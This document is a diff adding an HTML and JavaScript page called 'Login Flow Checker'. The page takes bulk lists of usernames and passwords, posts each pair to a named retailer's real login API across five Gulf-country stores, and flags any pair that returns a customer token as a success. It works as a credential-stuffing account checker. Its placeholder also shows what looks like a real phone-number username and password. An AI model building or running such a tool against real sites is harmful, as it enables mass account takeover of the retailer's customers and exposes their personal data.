@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Login Flow Checker (Multi-Country)</title>
+<style>
+ :root{--blue:#007BFF;--bg:#f4f7fa;--card:#fff;--shadow:0 4px 12px rgba(0,0,0,.1);--radius:10px}
+ *{box-sizing:border-box;margin:0;padding:0}
+ body{
+   font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+   background:var(--bg);color:#222;min-height:100vh;
+   display:flex;flex-direction:column;align-items:center;justify-content:center;
+ }
+ .container{width:90%;max-width:980px;background:var(--card);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
+ header{display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--blue);padding-bottom:10px;margin-bottom:18px}
+ header img{width:52px;height:52px}
+ header h1{font-size:22px;color:var(--blue);margin:0}
+ textarea{width:100%;height:140px;margin:14px 0;padding:10px 12px;border:1px solid #ccc;border-radius:6px;font-size:15px;font-family:inherit;resize:vertical}
+ .row{display:flex;gap:10px;flex-wrap:wrap}
+ input[type="text"],input[type="password"]{flex:1 1 260px;padding:10px 12px;border:1px solid #ccc;border-radius:6px;font-size:15px}
+ button{background:var(--blue);color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:600;transition:background .25s}
+ button:hover{background:#005fbe}
+ .muted{background:#666}.muted:hover{background:#555}
+ .copy{background:#00906d}.copy:hover{background:#007a5c}
+ #loading{display:none;color:#ff9800;font-weight:700;margin-top:6px}
+ fieldset{border:1px solid #ddd;border-radius:8px;padding:12px;margin:10px 0}
+ legend{padding:0 6px;color:#333;font-weight:700}
+ .country-grid{display:flex;flex-wrap:wrap;gap:12px}
+ .country-grid label{display:flex;align-items:center;gap:8px;border:1px solid #ddd;border-radius:6px;padding:6px 10px;background:#fff;cursor:pointer}
+ .output{margin-top:16px;padding:16px;background:#f9f9f9;border:1px solid #ddd;border-radius:8px}
+ ul{list-style:none;padding-left:0;margin:0}
+ li{padding:10px 0;border-bottom:1px solid #e1e1e1;line-height:1.35}
+ li:last-child{border-bottom:none}
+ .meta{font-size:12.5px;color:#555;margin-top:2px;word-break:break-all}
+ .chip{display:inline-block;font-size:11px;font-weight:700;padding:2px 8px;border-radius:999px;vertical-align:middle;letter-spacing:.4px;margin-left:6px}
+ .success{background:#d6f6d6;color:#0a6e0a}
+ .failure{background:#ffe1cc;color:#8d4500}
+ .error{background:#ffd9d9;color:#a10000}
+ footer{margin-top:18px;color:#888;font-size:13px;text-align:center}
+ .small{font-size:12px;color:#666;margin-top:8px}
+ code{background:#eef;padding:1px 5px;border-radius:4px}
+ .inline{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+<div class="container">
+  <header>
+    <img src="crawler.png" alt="Logo">
+    <h1>Login Flow Checker</h1>
+  </header>
+
+  <p style="margin-bottom:6px;font-size:14px">
+    Paste one or more credential lines below (<strong>JSON object</strong>, <strong>JSON array</strong>, or <code>email,password</code>), or use the quick fields.
+  </p>
+  <textarea id="bulk" placeholder='Examples:
+{"username":"0533645794","password":"Jarir13245!"}
+[{"username":"u1@example.com","password":"P1!"},{"username":"u2@example.com","password":"P2!"}]
+user@example.com,SuperSecret!'></textarea>
+
+  <div class="row">
+    <input id="u" type="text" placeholder="Quick username/email (optional)">
+    <input id="p" type="password" placeholder="Quick password (optional)">
+  </div>
+
+  <fieldset>
+    <legend>Countries</legend>
+    <div class="inline" style="margin-bottom:8px">
+      <button type="button" class="muted" onclick="selectAllCountries(true)">Select All</button>
+      <button type="button" class="muted" onclick="selectAllCountries(false)">Clear</button>
+    </div>
+    <div class="country-grid">
+      <label><input type="checkbox" class="country" value="SA" checked> Saudi Arabia (SA)</label>
+      <label><input type="checkbox" class="country" value="AE"> United Arab Emirates (AE)</label>
+      <label><input type="checkbox" class="country" value="KW"> Kuwait (KW)</label>
+      <label><input type="checkbox" class="country" value="QA"> Qatar (QA)</label>
+      <label><input type="checkbox" class="country" value="BH"> Bahrain (BH)</label>
+    </div>
+    <div class="small">We will call the store-specific endpoint: <code>/api/v2/&lt;store&gt;/user/login-v2</code> for each selected country.</div>
+  </fieldset>
+
+  <div class="row" style="margin-top:10px">
+    <button onclick="run()">Try Login</button>
+    <button class="muted" onclick="clearSession()">Clear Session</button>
+    <button class="copy" onclick="copyVisible()">Copy Visible</button>
+  </div>
+
+  <div id="loading">Contacting login API…</div>
+
+  <div class="output">
+    <h3 style="margin-top:0">Results</h3>
+    <ul id="list"></ul>
+    <p id="empty" style="display:none;color:#d00;font-weight:600;margin-top:6px">No attempts yet.</p>
+    <p class="small">
+      <strong>SUCCESS rule:</strong> <code>success === true</code> AND <code>type === "COMMERCE_CUSTOMER_TOKEN_GENERATED"</code> AND a non-empty <code>data.token</code>.<br>
+      Otherwise: <strong>FAILURE</strong>. Network/parse issues are <strong>ERROR</strong>.
+    </p>
+  </div>
+</div>
+
+<footer>© 2024 Login Flow Checker</footer>
+
+<script>
+/* Country → store mapping */
+const COUNTRY_MAP = {
+  SA: {store:'sa_en', label:'Saudi Arabia'},
+  AE: {store:'ae_en', label:'United Arab Emirates'},
+  KW: {store:'kw_en', label:'Kuwait'},
+  QA: {store:'qa_en', label:'Qatar'},
+  BH: {store:'bh_en', label:'Bahrain'}
+};
+const LOGIN_API = (store)=>`https://www.jarir.com/api/v2/${store}/user/login-v2`;
+
+/* state */
+let attempts = []; // {username, masked, country, store, status, message}
+
+/* helpers */
+function mask(p){ if(!p) return ''; return p.length<=2 ? '*'.repeat(p.length) : p[0] + '*'.repeat(Math.max(1,p.length-2)) + p[p.length-1]; }
+
+function selectAllCountries(on){
+  document.querySelectorAll('.country').forEach(c=>c.checked=!!on);
+}
+
+/* Robust JSON parsing for the whole textarea first, then fallback per-line */
+function parseBulk(){
+  const raw = document.getElementById('bulk').value.trim();
+  const rows = [];
+
+  // 1) Try entire blob as JSON (object or array)
+  if(raw){
+    try{
+      const all = JSON.parse(raw);
+      if(Array.isArray(all)){
+        all.forEach(obj=>{
+          if(obj && obj.username && obj.password){
+            rows.push({username:String(obj.username), password:String(obj.password)});
+          }
+        });
+        if(rows.length) return addQuick(rows);
+      }else if(all && typeof all==='object' && all.username && all.password){
+        rows.push({username:String(all.username), password:String(all.password)});
+        return addQuick(rows);
+      }
+    }catch{/* ignore, fallback */}
+  }
+
+  // 2) Fallback: line-by-line (JSON per line or CSV "email,password")
+  if(raw){
+    raw.split(/\r?\n/).forEach(line=>{
+      const t=line.trim(); if(!t) return;
+      if((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))){
+        try{
+          const v=JSON.parse(t);
+          if(Array.isArray(v)){
+            v.forEach(obj=>{
+              if(obj && obj.username && obj.password){
+                rows.push({username:String(obj.username), password:String(obj.password)});
+              }
+            });
+          }else if(v && v.username && v.password){
+            rows.push({username:String(v.username), password:String(v.password)});
+          }
+          return;
+        }catch{/* fall through */}
+      }
+      const m=t.split(',');
+      if(m.length>=2){
+        rows.push({username:m[0].trim(), password:m.slice(1).join(',').trim()});
+      }
+    });
+  }
+  return addQuick(rows);
+}
+
+function addQuick(rows){
+  const qU=document.getElementById('u').value.trim();
+  const qP=document.getElementById('p').value;
+  if(qU && qP) rows.push({username:qU,password:qP});
+  return rows;
+}
+
+/* strict success decision */
+function isSuccessResponse(j){
+  const okSuccess = j?.success === true;
+  const rightType = j?.type === 'COMMERCE_CUSTOMER_TOKEN_GENERATED';
+  const hasToken  = typeof j?.data?.token === 'string' && j.data.token.trim().length>0;
+  return okSuccess && rightType && hasToken;
+}
+
+/* main */
+async function run(){
+  const creds = parseBulk();
+  const countries = [...document.querySelectorAll('.country:checked')].map(i=>i.value);
+  if(!countries.length){ alert('Please select at least one country.'); return; }
+
+  document.getElementById('loading').style.display='block';
+  if(!creds.length){
+    alert('Provide at least one username/password (JSON object/array or CSV line, or use the quick fields).');
+    document.getElementById('loading').style.display='none';
+    return;
+  }
+
+  for(const {username,password} of creds){
+    for(const country of countries){
+      const map = COUNTRY_MAP[country];
+      if(!map) continue;
+
+      try{
+        const res = await fetch(LOGIN_API(map.store),{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ username, password })
+        });
+        const j = await res.json();
+        const status = isSuccessResponse(j) ? 'SUCCESS' : 'FAILURE';
+        const message = j?.message || j?.data?.message || '';
+
+        attempts.push({
+          username,
+          masked: mask(password),
+          country: country,
+          store: map.store,
+          status,
+          message
+        });
+      }catch(e){
+        attempts.push({
+          username,
+          masked: mask(password),
+          country: country,
+          store: map?.store || '?',
+          status:'ERROR',
+          message: String(e)
+        });
+      }
+      render(); // live update
+    }
+  }
+
+  document.getElementById('loading').style.display='none';
+  render();
+}
+
+function render(){
+  const ul=document.getElementById('list');
+  ul.innerHTML='';
+  attempts.forEach(a=>{
+    const cls = a.status==='SUCCESS' ? 'success' : (a.status==='FAILURE' ? 'failure' : 'error');
+    const label = `${a.country} / ${a.store}`;
+    const li=document.createElement('li');
+    li.innerHTML = `
+      <div><strong>${a.username}</strong> / <span style="font-family:monospace">${a.masked}</span>
+        <span class="chip ${cls}">${a.status}</span>
+      </div>
+      <div class="meta">${label}${a.message?` — ${escapeHtml(a.message)}`:''}</div>
+    `;
+    ul.appendChild(li);
+  });
+  document.getElementById('empty').style.display = attempts.length? 'none':'block';
+}
+
+function clearSession(){
+  attempts = [];
+  document.getElementById('bulk').value='';
+  document.getElementById('u').value='';
+  document.getElementById('p').value='';
+  document.getElementById('list').innerHTML='';
+  document.getElementById('empty').style.display='none';
+  document.getElementById('loading').style.display='none';
+  // Reset countries to SA only
+  document.querySelectorAll('.country').forEach(el=>el.checked = (el.value==='SA'));
+}
+
+function copyVisible(){
+  const out=[...document.querySelectorAll('#list li')].map(li=>li.innerText.trim()).join('\n\n');
+  if(!out){alert('Nothing to copy.');return;}
+  navigator.clipboard.writeText(out).then(()=>alert('Copied!'));
+}
+
+function escapeHtml(s){return (s||'').toString().replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+</script>
+<!-- (optional) identify and/or alias primary action -->
+<script> window.QA_TOOL_ID='login'; /* optional */ </script>
+<!-- include the bridge at the end -->
+<script src="qa_bridge.js"></script>
+
+</body>
+</html>
